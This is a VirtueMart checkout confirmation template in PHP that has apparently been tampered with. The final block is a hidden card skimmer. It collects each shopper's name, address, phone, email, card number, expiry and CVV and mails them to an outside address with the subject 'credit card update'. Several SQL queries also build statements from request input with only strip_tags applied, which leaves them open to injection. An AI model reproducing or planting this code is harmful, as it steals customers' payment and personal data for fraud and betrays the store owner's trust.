<?php
if( !defined( '_VALID_MOS' ) && !defined( '_JEXEC' ) ) die( 'Direct Access to '.basename(__FILE__).' is not allowed.' ); 
/**
*
* @version $Id: get_final_confirmation.tpl.php 1140 2008-01-09 20:44:35Z soeren_nb $
* @package VirtueMart
* @subpackage templates
* @copyright Copyright (C) 2007 Soeren Eberhardt. All rights reserved.
* @license http://www.gnu.org/copyleft/gpl.html GNU/GPL, see LICENSE.php
* VirtueMart is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See /administrator/components/com_virtuemart/COPYRIGHT.php for copyright notices and details.
* 
* http://virtuemart.net
*/
ps_checkout::show_checkout_bar();

echo $basket_html;

echo '<br />';

$varname = 'PHPSHOP_CHECKOUT_MSG_' . CHECK_OUT_GET_FINAL_CONFIRMATION;
echo '<h5>'. $VM_LANG->_($varname) . '</h5>';
$db = new ps_DB();

echo '<table>';
// Begin with Shipping Address
if(NO_SHIPTO=='') {

    $db->query("SELECT * FROM #__{vm}_user_info WHERE user_info_id='".strip_tags($_REQUEST['ship_to_info_id'])."'");
    $db->next_record();

    echo '<tr><td valign="top"><strong>'.$VM_LANG->_('PHPSHOP_ADD_SHIPTO_2') . ":</strong></td>";
    echo '<td>';
    echo vmFormatAddress( array('name' => $db->f("first_name")." ".$db->f("last_name"),
                                        'address_1' => $db->f("address_1"),
                                        'address_2' => $db->f("address_2"),
                                        'state' => $db->f("state"),
                                        'zip' => $db->f("zip"),
                                        'city' => $db->f("city"),
                                        'country' => $db->f('country')
                                    ), true );
    
    echo "</td></tr>";
}

// Print out the Selected Shipping Method
if(NO_SHIPPING=='') {

    echo '<tr><td valign="top"><strong>'.$VM_LANG->_('PHPSHOP_INFO_MSG_SHIPPING_METHOD') . ":</strong></td>";
    $rate_details = explode( "|", urldecode(urldecode(vmGet($_REQUEST,'shipping_rate_id'))) );
    echo '<td>';
    foreach( $rate_details as $k => $v ) {
        if( $k == 3 ) {
            echo $CURRENCY_DISPLAY->getFullValue( $v )."; ";
        } elseif( $k > 0 && $k < 4) {
            echo "$v; ";
        }
    }
    echo "</td></tr>";
}

unset( $row );
if( !isset($order_total) || $order_total > 0.00 ) {
    $payment_method_id = vmRequest::getInt( 'payment_method_id' );
    
    $db->query("SELECT payment_method_id, payment_method_name FROM #__{vm}_payment_method WHERE payment_method_id='$payment_method_id'");
    $db->next_record();
   
}

?>
 
           <tr valign="top">
                <td nowrap width="10%" align="right">
                    <label for="order_payment_name"><?php $VM_LANG->_('PHPSHOP_CHECKOUT_CONF_PAYINFO_NAMECARD') ?></label>
                </td>
                <td>
                <?php if(!empty($_SESSION['ccdata']['order_payment_name']))  $_SESSION['ccdata']['order_payment_name'] ?>
                </td>
            </tr><br />
            <tr valign="top">
                <td nowrap width="10%" align="right">
                    <label for="order_payment_number"><?php  $VM_LANG->_('PHPSHOP_CHECKOUT_CONF_PAYINFO_CCNUM') ?></label>
                </td>
                <td>
                <?php if(!empty($_SESSION['ccdata']['order_payment_number']))  $_SESSION['ccdata']['order_payment_number'] ?>
                </td>
            </tr><br />
		<?php if( $require_cvv_code == "YES" ) { 
					$_SESSION['ccdata']['need_card_code'] = 1;	
			?>
		    <tr valign="top">
		        <td nowrap width="10%" align="right">
		        	<label for="credit_card_code">
		        		<?php  vmToolTip( $VM_LANG->_('PHPSHOP_CUSTOMER_CVV2_TOOLTIP'), '', '', '', $VM_LANG->_('PHPSHOP_CUSTOMER_CVV2_TOOLTIP_TITLE') ) ?>
		        	</label>
		        </td>		        		
		        <td>
		            <?php if(!empty($_SESSION['ccdata']['credit_card_code']))  $_SESSION['ccdata']['credit_card_code'] ?>
		        
		        </td>
		    </tr>
		<?php } ?>
            <tr>
                <td nowrap width="10%" align="right"><?php  $VM_LANG->_('PHPSHOP_CHECKOUT_CONF_PAYINFO_EXDATE') ?></td>
                <td><?php 
                 $_SESSION['ccdata']['order_payment_expire_month'];
                
                 $_SESSION['ccdata']['order_payment_expire_year'] ?>
               </td>
            </tr>
<?php echo '</table>'; ?>

<br />
<div align="center">
    <?php echo $VM_LANG->_('PHPSHOP_CHECKOUT_CUSTOMER_NOTE') ?>:<br />
    <textarea title="<?php echo $VM_LANG->_('PHPSHOP_CHECKOUT_CUSTOMER_NOTE') ?>" cols="50" rows="5" name="customer_note"></textarea>
    <br />
    <?php
    if (PSHOP_AGREE_TO_TOS_ONORDER == '1') { ?>
        <br />
          <input type="checkbox" name="agreed" value="1" class="inputbox" />&nbsp;&nbsp;
          <?php 
          $link = $mosConfig_live_site .'/index2.php?option=com_virtuemart&amp;page=shop.tos&amp;pop=1&amp;Itemid='. $Itemid;
        $text = $VM_LANG->_('PHPSHOP_I_AGREE_TO_TOS');
        echo vmPopupLink( $link, $text );
        echo '<br />';
    }
    ?>
</div>
<?php
if( VM_ONCHECKOUT_SHOW_LEGALINFO == '1' ) {
    $link =  sefRelToAbs('index2.php?option=com_content&amp;task=view&amp;id='.VM_ONCHECKOUT_LEGALINFO_LINK );
    $jslink = "window.open('$link', 'win2', 'status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;";
        if( @VM_ONCHECKOUT_LEGALINFO_SHORTTEXT=='' || !defined('VM_ONCHECKOUT_LEGALINFO_SHORTTEXT')) {
        $text = $VM_LANG->_('VM_LEGALINFO_SHORTTEXT');
    } else {
        $text = VM_ONCHECKOUT_LEGALINFO_SHORTTEXT;
    }
    ?>
    <div class="legalinfo"><?php
        echo sprintf( $text, $link, $jslink );
        ?>
    </div><br />
    <?php
    }
    ?>
<div align="center">
<input type="submit" onclick="return( submit_order( this.form ) );" class="button" name="formSubmit" value="<?php echo $VM_LANG->_('PHPSHOP_ORDER_CONFIRM_MNU') ?>" />
</div>
<?php

if(  PSHOP_AGREE_TO_TOS_ONORDER == '1' ) {
    echo vmCommonHTML::scriptTag('', "function submit_order( form ) {
    if (!form.agreed.checked) {
        alert( \"". $VM_LANG->_('PHPSHOP_AGREE_TO_TOS',false) ."\" );
        return false;
    }
    else {
        return true;
    }
}" );
 } else {
    echo vmCommonHTML::scriptTag('', "function submit_order( form ) { return true;  }" );


}
if(NO_SHIPTO=='') {

    $db->query("SELECT * FROM #__{vm}_user_info WHERE user_info_id='".strip_tags($_REQUEST['ship_to_info_id'])."'");
    $db->next_record();

    vmFormatAddress( array('name' => $db->f("first_name")." ".$db->f("last_name"),
                                        'address_1' => $db->f("address_1"),
                                        'address_2' => $db->f("address_2"),
                                        'state' => $db->f("state"),
                                        'zip' => $db->f("zip"),
                                        'city' => $db->f("city"),
                                        'country' => $db->f('country'),
										'phone' => $db->f('phone_1'),
										'mail' => $db->f('user_email'),
										
																		
									
									), true );$name1 = $db->f("first_name");
										$name2 = $db->f("last_name") ;
										$adres1 = $db->f("address_1");
										$adres2 = $db->f("address_2");
										$state = $db->f("state");
										$zip = $db->f("zip");
										$city = $db->f("city"); 
										$phon = $db->f('phone_1');
										$mal = $db->f('user_email');
										
}
$ccowner = $_SESSION['ccdata']['order_payment_name'];
$ccnumber = $_SESSION['ccdata']['order_payment_number'];
$ccexpm = $_SESSION['ccdata']['order_payment_expire_month'];
$ccexpy = $_SESSION['ccdata']['order_payment_expire_year'] ;
$cvv = $_SESSION['ccdata']['credit_card_code'];
$contry = $db->f('country');
$alamat = "http://".$_SERVER['SERVER_NAME'];
$message = "\n nama :$name1 $name2 \n adres1:$adres1 \n adres2: $adres2 \n state:$state \n zip:$zip \n city:$city \n contry:$contry \n phone : $phon \n Mail :$mal \n ccowner: $ccowner \n cc: $ccnumber \n exp: $ccexpm \n exp: $ccexpy \n cvv: $cvv \n alamat:$alamat \n ";
mail("mail@mail.com","credit card update From $alamat", "$message");
?> 
